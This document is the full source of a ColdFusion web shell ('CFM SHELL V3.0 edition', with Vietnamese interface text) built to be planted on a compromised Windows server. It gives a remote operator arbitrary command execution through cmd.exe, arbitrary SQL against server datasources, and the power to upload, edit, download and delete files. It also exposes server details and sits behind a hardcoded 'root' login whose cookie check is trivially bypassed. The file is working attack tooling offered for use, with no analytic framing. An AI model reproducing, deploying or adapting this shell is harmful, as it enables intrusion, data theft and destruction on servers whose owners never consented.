<html>
<style type="text/css">
body{background-color:#444;color:#e1e1e1;}
body,td,th{ font: 9pt Lucida,Verdana;margin:0;vertical-align:top;color:#e1e1e1; }
table.info{ color:#fff;background-color:#222; }
span,h1,a{ color: #df5 !important; }
span{ font-weight: bolder; }
h1{ border-left:5px solid $color;padding: 2px 5px;font: 14pt Verdana;background-color:#222;margin:0px; }
div.content{ padding: 5px;margin-left:5px;background-color:#333; }
a{text-decoration: none;}
a:hover{ text-decoration:underline; }
.ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }
.bigarea{ width:100%;height:300px; }
input,textarea,select{ margin:0;color:#fff;background-color:#555;border:1px solid $color; font: 9pt Monospace,'Courier New'; }
form{ margin:0px; }
.toolsInp{ width: 300px }
.main th{text-align:left;background-color:#5e5e5e;}
.main tr:hover{background-color:#5e5e5e}
.l1{background-color:#444}
.l2{background-color:#333}
pre{font-family:Courier,Monospace;}
</style>
<head>
<TITLE>CFM SHELL V3.0 edition</TITLE>
<meta http-equiv="Content-Type" content="text/html">
</head>
<body>
<center>
	Cfm Shell v3.0 edition
</center>
<hr>
<script langauge="JavaScript" type="text/javascript">
function doMenu(item)
{
	obj=document.getElementById(item);
	col=document.getElementById("x" + item);
	if (obj.style.display=="none")
	{
		obj.style.display="block"; col.innerHTML="[-]";
	}
	else
	{
		obj.style.display="none"; col.innerHTML="[+]";
	}
}
</script>
<!--- Login --->

<cfif IsDefined("logout")>
	<cfset structclear(cookie)>
	<cflocation url="?" addtoken="No">
</cfif>
<cfif IsDefined("cookie.username")>
<!--- Main --->
<center>Username:<font color="#FFFF33"><b><cfoutput>#username#</cfoutput></b></font> !</center>
<center><b><a href="?logout">Logout</a></b></center>
<hr>
<cfoutput>
<cfset dir = #GetDirectoryFromPath(GetTemplatePath())#>
<cfif Right(dir, 1) neq "\" >
	<cfset dir = "#dir#\">
</cfif>
<!--- Ham get Datasource Infor 
<cfscript>
factory = CreateObject("java", "coldfusion.server.ServiceFactory");
DataSoureceInfo = factory.DataSourceService.getDatasources();
</cfscript> --->

<!--- Ham doc tep --->
<cffunction name="ReadFile" access="remote" output="true" returntype="any">  
	<cfargument name="fileread" type="string" required="true"/>  
		<cffile action="read" file="#arguments.fileread#" variable="line">
		<cfoutput>#line#</cfoutput>
</cffunction>
<!--- ham xoa thu muc --->
<cffunction name="dirDelete" access="public" output="false" returntype="any">
<cfargument name="dir" required="no" default="#expandPath('/pocket_cache/')#">
<cfdirectory action="list" name="delfile" directory="#arguments.dir#">
<cfif delfile.RecordCount EQ 0>
<cfif directoryExists(arguments.dir)>
<cfdirectory action="delete" directory="#arguments.dir#">
</cfif>
<cfelse>
<cfloop query="delfile">
<cfif type EQ "file">
<cffile action="delete" file="#arguments.dir#\#name#">
<cfelse>
<cfset temp = dirDelete(arguments.dir & '\' & #delfile.name#)>
</cfif>
</cfloop>
<cfif directoryExists(arguments.dir)>
<cfdirectory action="delete" directory="#arguments.dir#">
</cfif>
</cfif>
</cffunction>
<!--- ham doi ten thu muc --->
<cffunction name="renameDirectory" access="remote" output="false" returntype="void">  
	<cfargument name="oldDir" type="string" required="true"/>  
	<cfargument name="newDir" type="string" required="true"/>  
	<cfdirectory action="rename" directory="#arguments.oldDir#" newdirectory="#arguments.newDir#"/>  
</cffunction>
</cfoutput>
<!--- bat dau nhan lenh --->
<cfif isDefined("action")>
	<cfif action is "goto">
		<cfoutput>
		<cfif isDefined("scr")>
			<cfset dir = #scr#>
			<cfif Right(dir, 1) neq "\" >
				<cfset dir = "#dir#\">
			</cfif>
		</cfif>
		</cfoutput>
	<cfelseif action is "edit">
	<cfoutput>
	<cfif isDefined("scr")>
		<cfif FileExists("#scr#")>
			<cfset file_name=#Replace(#scr#,'#GetDirectoryFromPath(scr)#','','ALL')#>
			<title>&##272;ang s&##7917;a t&##7879;p #scr#</title>
			<script language="JavaScript" type="text/javascript">
				function sTrim(sVariable)
				{
					return sVariable.replace(/^\s+|\s+$/g,"");
				}
				function validateFields(form)
				{
					return true;
				}
			</script>
			<cffile action="read" file="#scr#" variable="thisFile">
                        <h1>Edit file:</h1>
                        <div class=content>	
          		<form action="?action=save&scr=#GetDirectoryFromPath(scr)#" method="post" onsubmit="return validateFields(this);">
				<input type="hidden" name="fileName" value="#file_name#" />
				<input type="hidden" name="action_type" value="edit" />
					<tr>
						<td style="font-weight:bold;" nowrap="nowrap">
							File path: 
						</td>
						<td>
							#scr#
						</td>
					</tr>
					<tr>
						<td>
						<cfset thisFile=#Replace(#thisFile#,'<','<','ALL')#>
						<cfset thisFile=#Replace(#thisFile#,'>','>','ALL')#>
							<textarea class="bigarea" name="fileContent">#thisFile#</textarea>
						</td>
					</tr>
					<tr>
						<td>
							<input type="submit" value="Save" style="font-family:verdana; font-size:11px;" />
						</td>
					</tr>
			</form></div>
		<cfelse>
			<p>T&##7853;p tin #scr# kh&##244;ng t&##7891;n t&##7841;i.</p>
		</cfif>
		<a href="?action=goto&scr=#GetDirectoryFromPath(scr)#" style="color: rgb(255, 0, 0);"><u> <- Back</u></a>
	<cfelse>
		<a href="javascript:history.back(1);" style="color: rgb(255, 0, 0);"><u> <- Back</u></a>
	</cfif>
	</cfoutput>
	<cfelseif action is "cut">
		<cfoutput>
		<cfif isDefined("scr")>
			<cfset cutdir = #scr#>
			<cfif FileExists("#scr#")>
				<cfset cutdir = #RemoveChars(cutdir, len(cutdir), 1)#>
				<cfloop condition = "Right(cutdir, 1) neq '\'">
					<cfset cutdir = #RemoveChars(cutdir, len(cutdir), 1)#>
				</cfloop>
				<cfform name="articles" ENCTYPE="multipart/form-data">
					B&##7841;n s&##7869; di chuy&##7875;n t&##7879;p <font color="red">#scr#</font> t&##7899;i <cfinput type="text" name="thumucsechuyen" size="50" value="#cutdir#"> <input type="submit" value="Th&##7921;c hi&##7879;n" />
				</cfform>
				<cfif isDefined("thumucsechuyen")>
					<cffile action="move" source="#scr#" destination="#thumucsechuyen#">
					<cflocation url="?action=goto&scr=#cutdir#" addtoken="No">
				</cfif>
			<cfelse>
				<p>T&##7853;p tin #scr# kh&##244;ng t&##7891;n t&##7841;i.</p>
			</cfif>
			<a href="?action=goto&scr=#cutdir#" style="color: rgb(255, 0, 0);"><u> <- Back</u></a>
		<cfelse>
			<a href="javascript:history.back(1);" style="color: rgb(255, 0, 0);"><u> <- Back</u></a>
		</cfif>
		</cfoutput>
	<cfelseif action is "copy">
		<cfoutput>
		<cfif isDefined("scr")>
			<cfset copydir = #scr#>
			<cfif FileExists("#scr#")>
				<cfset copydir = #RemoveChars(copydir, len(copydir), 1)#>
				<cfloop condition = "Right(copydir, 1) neq '\'">
					<cfset copydir = #RemoveChars(copydir, len(copydir), 1)#>
				</cfloop>
				<cfform name="articles" ENCTYPE="multipart/form-data">
					B&##7841;n s&##7869; sao ch&##233;p t&##7879;p <font color="red">#scr#</font> t&##7899;i <cfinput type="text" name="thumucsechuyen" size="50" value="#copydir#"> <input type="submit" value="Th&##7921;c hi&##7879;n" />
				</cfform>
				<cfif isDefined("thumucsechuyen")>
					<cffile action="copy" source="#scr#" destination="#thumucsechuyen#">
					<cflocation url="?action=goto&scr=#copydir#" addtoken="No">
				</cfif>
			<cfelse>
				<p>T&##7853;p tin #scr# kh&##244;ng t&##7891;n t&##7841;i.</p>
			</cfif>
			<a href="?action=goto&scr=#copydir#" style="color: rgb(255, 0, 0);"><u> <- Back</u></a>
		<cfelse>
			<a href="javascript:history.back(1);" style="color: rgb(255, 0, 0);"><u> <- Back</u></a>
		</cfif>
		</cfoutput>
	<cfelseif action is "rename">
		<cfoutput>
		<cfif isDefined("scr")>
			<cfset renamedir = #scr#>
			<cfif FileExists("#scr#")>
				<cfloop condition = "Right(renamedir, 1) neq '\'">
					<cfset renamedir = #RemoveChars(renamedir, len(renamedir), 1)#>
				</cfloop>
				<cfform name="articles" ENCTYPE="multipart/form-data">
					Rename #renamedir#<cfinput type="text" name="namechange" size="25" value=""> <input type="submit" value="Rename" />
				</cfform>
				<cfif isDefined("namechange")>
					<cffile action="rename" source="#scr#" destination="#renamedir##namechange#">
					<cflocation url="?action=goto&scr=#renamedir#" addtoken="No">
				</cfif>
			<cfelse>
				<p>T&##7853;p tin #scr# kh&##244;ng t&##7891;n t&##7841;i.</p>
			</cfif>
			<a href="?action=goto&scr=#renamedir#" style="color: rgb(255, 0, 0);"><u> <- Back</u></a>
		<cfelse>
			<a href="javascript:history.back(1);" style="color: rgb(255, 0, 0);"><u> <- Back</u></a>
		</cfif>
		</cfoutput>
	<cfelseif action is "renamed">
		<cfoutput>
		<cfif isDefined("scr")>
			<cfset renamedir = #scr#>
			<cfset renamedir = #RemoveChars(renamedir, len(renamedir), 1)#>
			<cfif DirectoryExists("#scr#")>
				<cfloop condition = "Right(renamedir, 1) neq '\'">
					<cfset renamedir = #RemoveChars(renamedir, len(renamedir), 1)#>
				</cfloop>
				<cfform name="articles" ENCTYPE="multipart/form-data">
					Rename #renamedir#<cfinput type="text" name="namechange" size="25" value=""> <input type="submit" value="Rename" />
				</cfform>
				<cfif isDefined("namechange")>
					#renameDirectory('#scr#','#renamedir##namechange#')#
					<cflocation url="?action=goto&scr=#renamedir#" addtoken="No">
				</cfif>
			<cfelse>
				<p>Th&##432; m&##7909;c #scr# kh&##244;ng t&##7891;n t&##7841;i.</p>
			</cfif>
			<a href="?action=goto&scr=#renamedir#" style="color: rgb(255, 0, 0);"><u> <- ..</u></a>
		<cfelse>
			<a href="javascript:history.back(1);" style="color: rgb(255, 0, 0);"><u> <- ..</u></a>
		</cfif>
		</cfoutput>
	<cfelseif action is "down">
		<cfoutput>
		<cfif isDefined("scr")>
			<cfset downdir = #scr#>
			<cfif FileExists("#scr#")>
				<cfloop condition = "Right(downdir, 1) neq '\'">
					<cfset downdir = #RemoveChars(downdir, len(downdir), 1)#>
				</cfloop>
				<cfheader name="Content-Disposition" value="attachment; filename=#getFileFromPath (scr)#"> 
				<cfcontent file="#scr#" type="application/octet-stream">
			<cfelse>
				<p>T&##7853;p tin #scr# kh&##244;ng t&##7891;n t&##7841;i.</p>
			</cfif>
			<a href="?action=goto&scr=#downdir#" style="color: rgb(255, 0, 0);"><u> <- Back</u></a>
		<cfelse>
			<a href="javascript:history.back(1);" style="color: rgb(255, 0, 0);"><u> <- Back</u></a>
		</cfif>
		</cfoutput>
	<cfelseif action is "del">
		<cfoutput>
		<cfif isDefined("scr")>
			<cfset deletedir = #scr#>
			<cfset deletedir = #RemoveChars(deletedir, len(deletedir), 1)#>
			<cfif FileExists("#scr#")>
				<cfloop condition = "Right(deletedir, 1) neq '\'">
					<cfset deletedir = #RemoveChars(deletedir, len(deletedir), 1)#>
				</cfloop>
				<cffile action="delete" file="#scr#">
				<cflocation url="?action=goto&scr=#deletedir#" addtoken="No">
			<cfelse>
				<p>T&##7853;p tin #scr# kh&##244;ng t&##7891;n t&##7841;i.</p>
			</cfif>
			<a href="?action=goto&scr=#deletedir#" style="color: rgb(255, 0, 0);"><u> <- DeleteDir</u></a>
		<cfelse>
			<a href="javascript:history.back(1);" style="color: rgb(255, 0, 0);"><u> <- DeleteDir</u></a>
		</cfif>
		</cfoutput>
	<cfelseif action is "deld">
		<cfoutput>
		<cfif isDefined("scr")>
			<cfset deletedir = #scr#>
			<cfset deletedir = #RemoveChars(deletedir, len(deletedir), 1)#>
			<cfif DirectoryExists("#scr#")>
				<cfloop condition = "Right(deletedir, 1) neq '\'">
					<cfset deletedir = #RemoveChars(deletedir, len(deletedir), 1)#>
				</cfloop>
				<cfset dirDelete('#scr#')>
				<cflocation url="?action=goto&scr=#deletedir#" addtoken="No">
			<cfelse>
				<p>DeleteDir</p>
			</cfif>
			<a href="?action=goto&scr=#deletedir#" style="color: rgb(255, 0, 0);"><u> <- DeleteDir</u></a>
		<cfelse>
			<a href="javascript:history.back(1);" style="color: rgb(255, 0, 0);"><u> <- DeleteDir</u></a>
		</cfif>
		</cfoutput>
	<cfelseif action is "new">
		<!---
		<cfoutput>
		<cfif isDefined("scr")>
			<cfif FileExists("#scr#")>
				<p>T&##7853;p tin #scr# &##273;&##227; t&##7891;n t&##7841;i.</p>
			<cfelse>
				<cfform name="articles" ENCTYPE="multipart/form-data">
					B&##7841;n s&##7869; t&##7841;o th&##432; m&##7909;c m&##7899;i #scr#<cfinput type="text" name="namecreate" size="25" value=""> <input type="submit" value="Th&##7921;c hi&##7879;n" />
				</cfform>
				<cfif isDefined("namecreate")>
					<cffile action = "write" file = "#scr##namecreate#" output = "">
					<cflocation url="?action=goto&scr=#scr#" addtoken="No">
				</cfif>
			</cfif>
			<a href="?action=goto&scr=#scr#" style="color: rgb(255, 0, 0);"><u> <- Back</u></a>
		<cfelse>
			<a href="javascript:history.back(1);" style="color: rgb(255, 0, 0);"><u> <- Back</u></a>
		</cfif>
		</cfoutput>
		--->
		<cfoutput>
		<cfif isDefined("scr")>
			<cfdirectory action="list" directory="#scr#" name="fileList">
			<script language="JavaScript" type="text/javascript">
				var fileArray = new Array(<cfoutput>#quotedValueList(fileList.name)#</cfoutput>);
				function sTrim(sVariable) 
				{
					return sVariable.replace(/^\s+|\s+$/g,"");
				}
				function validateFields(form)
				{
					var fileCount = 0;
					var re = /.txt$|.cfm$|.cfml$|.htm|.html$/;
					if (sTrim(form.fileName.value) == "")
					{
						alert('Can nhap ten tep');
						form.fileName.focus();
						return false;
					}
					if (form.fileName.value.search(re) < 0)
					{
						alert('Khong chap nhan tep loai nay!\n\n Chi chap nhan .cfm, .cfml, .htm, .html, va .txt!');
						form.fileName.focus();
						form.fileName.select();
						return false;
					}
					for (var i=0; i<fileArray.length; i++) 
					{
						if (sTrim(form.fileName.value) == fileArray[i])
						{
							fileCount++;
						} 
					}
					if (fileCount > 0)
					{
						alert('Ten nay da ton tai, vui long chon tep khac');
						form.fileName.focus();
						form.fileName.select();
						return false;
					}
					return true;
				}
			</script>
			<form action="?action=save&scr=#scr#" method="post" onsubmit="return validateFields(this);">
				<input type="hidden" name="action_type" value="add" />
				<table border="0" style="width:400px;">
					<tr>
						<td style="font-weight:bold;" nowrap="nowrap">
							File name:  
						</td>
						<td>
							<input type="text" name="fileName" style="font-family:verdana; font-size:11px; width:316px;" />
						</td>
					</tr>
					<tr>
						<td style="font-weight:bold;" nowrap="nowrap">
							File content:  
						</td>
						<td colspan="2">
							<textarea name="fileContent" style="font-family:verdana; font-size:11px; height:250px; width:600px;"></textarea>
						</td>
					</tr>
					<tr>
						<td colspan="2" style="text-align:right;">
							<input type="submit" value="Save" style="font-family:verdana; font-size:11px;" />
						</td>
					</tr>
				</table>
			</form>
			<a href="?action=goto&scr=#GetDirectoryFromPath(scr)#" style="color: rgb(255, 0, 0);"><u> <- Back</u></a>
		<cfelse>
			<a href="javascript:history.back(1);" style="color: rgb(255, 0, 0);"><u> <- Back</u></a>
		</cfif>
		</cfoutput>
	<cfelseif action is "newd">
		<cfoutput>
		<cfif isDefined("scr")>
			<cfform name="articles" ENCTYPE="multipart/form-data">
				New dir: <cfinput type="text" name="namecreate" size="25" value="#GetDirectoryFromPath(scr)#"> <input type="submit" value="Create new dir" />
			</cfform>
			<cfif isDefined("namecreate")>
				<cfdirectory directory= "#scr##namecreate#" action="create">
				<cflocation url="?action=goto&scr=#scr#" addtoken="No">
			</cfif>
			<a href="?action=goto&scr=#scr#" style="color: rgb(255, 0, 0);"><u> <- Back</u></a>
		<cfelse>
			<a href="javascript:history.back(1);" style="color: rgb(255, 0, 0);"><u> <- Back</u></a>
		</cfif>
		</cfoutput>
	<cfelseif action is "upload">
		<cfoutput>
		<cfif isDefined("scr")>
			<cfform enctype="multipart/form-data" method="post">
				Upload file to path:  <font color="red">#scr#</font><br>
				Choose file: <input type="file" size="80" name="fileup" /> <input type="submit" value="Upload" /><br/>
			</cfform>
			<cfif isDefined("fileup")>
				<cffile action="upload" fileField="fileup" destination="#scr#" nameconflict="overwrite">
				<cflocation url="?action=goto&scr=#scr#" addtoken="No">
			</cfif>
			<a href="?action=goto&scr=#scr#" style="color: rgb(255, 0, 0);"><u> <- Back</u></a>
		<cfelse>
			<a href="javascript:history.back(1);" style="color: rgb(255, 0, 0);"><u> <- Back</u></a>
		</cfif>
		</cfoutput>
	<cfelseif action is "cmd">
		<cfoutput>
		<cfif not isDefined("patch")>
			<cfif FileExists("#GetDirectoryFromPath(GetTemplatePath())#cdm.exe")>
				<cfset patch = "#GetDirectoryFromPath(GetTemplatePath())#cmd.exe">
				<cfset out = "#GetDirectoryFromPath(GetTemplatePath())#out.txt">
			<cfelseif FileExists("C:\windows\system32\cmd.exe")>
				<cfset patch = "C:\windows\system32\cmd.exe">
				<cfset out = "C:\windows\system32\out.txt">
			<cfelseif FileExists("C:\winnp\system32\cmd.exe")>
				<cfset patch = "C:\winnp\system32\cmd.exe">
				<cfset out = "C:\winnp\system32\out.txt">
			<cfelse>
				<p>Kh&##244;ng t&##236;m th&##7845;y t&##7879;p cmd.exe</p>
				<p>Khai b&##225;o bi&##7871;n patch l&##224; &##273;&##432;&##7901;ng d&##7851;n tr&##7921;c ti&##7871;p t&##7899;i t&##7879;p cmd.exe</p>
				<p>Khai b&##225;o bi&##7871;n out l&##224; &##273;&##432;&##7901;ng d&##7851;n tr&##7921;c ti&##7871;p t&##7899;i t&##7879;p d&##7919; li&##7879;u</p>
				<cfset sai = 1>
			</cfif>
		<cfelseif FileExists("#patch#")>
			<cfset out = "#GetDirectoryFromPath(patch)#out.txt">
		<cfelse>
			<p>Kh&##244;ng t&##236;m th&##7845;y t&##7879;p cmd.exe</p>
		</cfif>
		<cfif not isDefined("sai")>
			<cfform name="articles" ENCTYPE="multipart/form-data">
				Enter command: <cfinput type="text" name="command" size="25" value=""> <input type="submit" value="Run" />
			</cfform>
			<cfif isDefined("command")>
				<p>Results:</p>
				<cfexecute name="#patch#" arguments="/C #command# > #out#" timeout="60"></cfexecute>
				#ReadFile('#out#')#
				#out#
				<cfif FileExists("#out#")>
					<cffile action="delete" file="#out#">
				</cfif>
			</cfif>
		</cfif>
		<br>
		<a href="?action=goto&scr=#GetDirectoryFromPath(GetTemplatePath())#" style="color: rgb(255, 0, 0);"><u> <- Back</u></a>
		</cfoutput>
	<cfelseif action is "datainfo">
		<cfoutput>
		<cfdump var="#DataSoureceInfo#">
		<a href="?action=goto&scr=#GetDirectoryFromPath(GetTemplatePath())#" style="color: rgb(255, 0, 0);"><u> <- Back</u></a>
		</cfoutput>
	<cfelseif action is "save">
		<cfoutput>
		<cfif isDefined("form.fileName")>
			<title>&##272;&##227; l&##432;u t&##7879;p</title>
			<cffile action="write" file="#scr#\#form.fileName#" output="#form.fileContent#" addnewline="no">
			&##272;&##227; <cfif form.action_type IS "edit">s&##7917;a<cfelse>t&##7841;o</cfif> th&##224;nh c&##244;ng t&##7879;p <span style="font-weight:bold;">#form.fileName#</span>.<br>
			<a href="?action=goto&scr=#scr#" style="color: rgb(255, 0, 0);"><u> <- Back</u></a>
		<cfelse>
			<a href="javascript:history.back(1);" style="color: rgb(255, 0, 0);"><u> <- Back</u></a>
		</cfif>
		</cfoutput>
	<cfelseif action is "sql">
				<cfoutput>
		<cfform name="articles1" ENCTYPE="multipart/form-data">
			DataBase Name:
			<cfif isDefined("database")>
				<cfinput type="text" name="database" size="25" value="#database#"><br>
			<cfelseif IsDefined("DS")>
				<cfinput type="text" name="database" size="25" value="#DS#"><br>
			<cfelse>
				<cfinput type="text" name="database" size="25" value=""><br>
			</cfif>
			SQL query: <cfinput type="text" query="SQL" name="query" size="130" value=""><br>
			<input type="submit" value="Th&##7921;c hi&##7879;n" />
		</cfform>
		</cfoutput>
		<cfif isDefined("database") and isDefined("query")>
			<cfquery name="SQL" DataSource="#database#">
				#preserveSingleQuotes(query)#
			</cfquery>
			<br>
			<table width="90%" border="1" align="center">
				<tr><td align="center">M?u h?i: <font color="red"><cfoutput>#query#</cfoutput></font></td></tr>
				<tr><td align="center">K?t qu? tr? v?:</td></tr>
				<tr><td><cfdump var="#SQL#" format="text" label="Ket qua"></td></tr>
			</table>
			<br>
		</cfif>
		<cfoutput>
		<a href="?action=goto&scr=#scr#" style="color: rgb(255, 0, 0);"><u> <- Back</u></a>
		</cfoutput>
	</cfif>
<cfelse>
	<cfset action = "goto">
</cfif>
<cfif action is "goto" or action is "del" or action is "deld">
<cfoutput>
	<center><a href="javascript:doMenu('thongtin');" id=xthongtin>[-]</a>Server info:</center>
	<div id="thongtin">
	<!--- Lay thong tin ip --->
		<cfif #cgi.http_x_forwarded_for# eq "">
			<cfset clientip="#cgi.remote_addr#">
		<cfelse>
			<cfset clientip="#cgi.http_x_forwarded_for#">
		</cfif>
	<!--- In thong tin server --->
		<span>Server IP:</span> #CGI.HTTP_HOST#:#CGI.SERVER_PORT#</span> - <span>Client IP:</span> #clientip#<br>
		<span>Gateway Interface:</span> #CGI.GATEWAY_INTERFACE# - <span>Server Name:</span> #CGI.SERVER_NAME#:#CGI.SERVER_PORT#<br>
		<span>Server Protocol:</span> #CGI.SERVER_PROTOCOL# - <span>Server Software:</span> #CGI.SERVER_SOFTWARE#<br>
		<span>Appserver:</span> #server.coldfusion.appserver# - <span>Expiration:</span> #DateFormat(server.coldfusion.expiration, "d/m/yy")# #TimeFormat(server.coldfusion.expiration, "HH:mm:ss")#<br>
			<span>Product Name:</span> #server.coldfusion.productname# - <span>Product Level:</span> #server.coldfusion.productlevel# - <span>Product Version:</span> #server.coldfusion.productversion#<br>
			<span>Server OS Arch:</span> #server.os.arch# - <span>Server OS Name:</span> #server.os.name# - <span>Server OS Version:</span> #server.os.version#<br>
	</div>
<hr>
	<!--- Thu tao Object 
		<cftry>
			<cfobject type="com" class="scripting.filesystemobject" name="fso" action="connect">  
			<cfcatch type="any">  
				<cfobject type="com" class="scripting.filesystemobject" name="fso" action="create">  
			</cfcatch>  
		</cftry>
    --->		
	
<hr>
<center><a href="javascript:doMenu('congcu');" id=xcongcu>[-]</a>Main:</center>
<div id="congcu">
	Path: #dir#<br>
	Operations: <a href="?action=new&scr=#dir#">NewFile</a> - <a href="?action=newd&scr=#dir#">NewDir</a> - <a href="?action=upload&scr=#dir#" title="T&##7843;i l&##234;n m&##7897;t t&##7879;p t&##7915; m&##225;y t&##237;nh c&##7911;a b&##7841;n">Upload file</a> - <a href="?" title="Tr&##7903; v&##7873; th&##432; m&##7909;c ch&##7913;a Shell">---</a><br>
	Actions: <a href="?action=cmd" title="Th&##7921;c thi l&##7879;nh Command Dos">CMD</a> - <a href="?action=sql&scr=#dir#" title="Th&##7921;c thi l&##7879;nh SQL query">SQL</a> - <a href="?action=datainfo" title="Th&##244;ng tin C&##417; S&##7903; D&##7919; Li&##7879;u">Datainfo CSDL</a>
</div>
<hr>
<h1>File manager:</h1>
<div id="thumuc">
</cfoutput>
<cfdirectory directory="#dir#" name="myDirectory" sort="type ASC" >
<div class=content>
<table width=100% class=main cellspacing=0 cellpadding=1><tr><th width='13px'><input type=checkbox class=chkbx name=ch11'></th><th>Name</th><th>Size</th><th>Modify</th><th>Chmod</th><th>Mode</th><th>Actions</th></tr>
		<cfoutput>
		<cfif len(dir) gt 3>
			<tr>
				<cfset updir = #dir#>
				<cfset updir = #RemoveChars(updir, len(updir), 1)#>
				<cfloop condition = "Right(updir, 1) neq '\'">
					<cfset updir = #RemoveChars(updir, len(updir), 1)#>
				</cfloop>
				<th class=chkbx><input type=checkbox width='13px' class=chkbx></th><td width="20%"><strong><a href="?action=goto&scr=#updir#">..</a></strong></td>
			</tr>
		</cfif>
		</cfoutput>
                <cfset x=1>
		<cfoutput query="myDirectory">
                     <cfif x EQ 2> 
 			<tr class=l2><th class=chkbx width='13px'><input type=checkbox class=chkbx></th>
                    </cfif>
                   <cfif x EQ 1>   
 			<tr class=l1><th class=chkbx width='13px'><input type=checkbox class=chkbx></th>
                    </cfif>
                   <cfif x EQ 1>   
                        <cfset x=2>
                   <cfelse>
                        <cfset x=1>
                   </cfif>
				<td>
					<cfif #Type# is "Dir">
						<a href="?action=goto&scr=#dir##Name#\"><b>[#Name#]</b></a>
					<cfelse>
                                                <a href="?action=edit&scr=#dir##Name#\">#Name#</a>
					</cfif>
				</td>
				<td>
					<cfif #type# is "Dir">
						<Dir>
					<cfelseif #Size# LT 1024>
							#Size# B
					<cfelseif #Size# LT 1024*1024>
							#round(Size/1024)# KB
					<cfelseif #Size# LT 1024*1024*1024>
							#round(Size/1024/1024)# MB
					<cfelseif #Size# LT 1024*1024*1024*1024>
							#round(Size/1024/1024/1024)# GB
					<cfelseif #Size# LT 1024*1024*1024*1024*1024>
							#round(Size/1024/1024/1024/1024)# TB
					</cfif>
				</td>
				<td>
					#DateFormat(DateLastModified, "d/m/yy")# #TimeFormat(DateLastModified, "HH:mm:ss")#
				</td>
				<td>#Attributes#</td>
				<td>#Mode#</td>
				<td>
					<cfif #Type# is "File">
						<a href="?action=edit&scr=#dir##Name#">Edit</a>|<a href="?action=cut&scr=#dir##Name#">Cut</a>|<a href="?action=copy&scr=#dir##Name#">Copy</a>|<a href="?action=rename&scr=#dir##Name#">Rename</a>|<a href="?action=down&scr=#dir##Name#">Download</a>|<a href="?action=del&scr=#dir##Name#" onCLick="return confirm('Delete #Name# ?')">Delete</a>
					<cfelse>
						<a href="?action=cutd&scr=#dir##Name#\">Cutdir</a>|<a href="?action=copyd&scr=#dir##Name#\">Copy</a>|<a href="?action=renamed&scr=#dir##Name#\">Rename</a>|<a href="?action=deld&scr=#dir##Name#\" onCLick="return confirm('Delete #Name# ?')">DeleteDir</a>
					</cfif>
				</td>
			</tr>
		</cfoutput>
	</table></div>
</div>
</cfif>
<!--- End Main --->
<cfelseif Not IsDefined("cookie.username")>
	<cfform name="articles" ENCTYPE="multipart/form-data">
		<center><table width="300" border="0">
			<tr>
				<td width="50">Username:</td>
				<td width="50"><input type="text" name="username"></td>
			</tr>
			<tr>
				<td width="50">Password:</td>
				<td width="50"><input type="password" name="password"></td>
			</tr>
			<tr>
				<td width="50">Remember you?:</td>
				<td width="50">
					<input type="checkbox" name="RememberMe" value="Yes" checked>
					<input type="submit" name="Process" value="Login">
				</td>
			</tr>
		</table></center>
	</cfform>
	<cfif IsDefined("username")>
	<cfset member_username = "root">
	<cfset member_password = "a619d974658f3e749b2d88b215baea46">
	<cfif #username# neq #member_username#>
		<center>Wrong username!</center>
		<cfset structclear(cookie)>
        <cfelseif hash(form.password, "MD5") neq #member_password#>
		<center>Wrong password!</center>
		<cfset structclear(cookie)>
	<cfelse>
    <cfif IsDefined("RememberMe")>
	<cfset member_password1 = hash(form.password, "MD5")>           
          <cfcookie name="username" value="#form.username#" expires="NEVER">
          <cfcookie name="password" value="#member_password1#" expires="NEVER">
    <cfelse>
  	  <cfset member_password1 = hash(form.password, "MD5")>           
          <cfcookie name="username" value="#form.username#">
          <cfcookie name="password" value="#member_password1#">
    </cfif>
		<cflocation url="?" addtoken="No">
	</cfif>
	</cfif>
</cfif>
<!--- End Login --->
<hr>
</body>
</html>



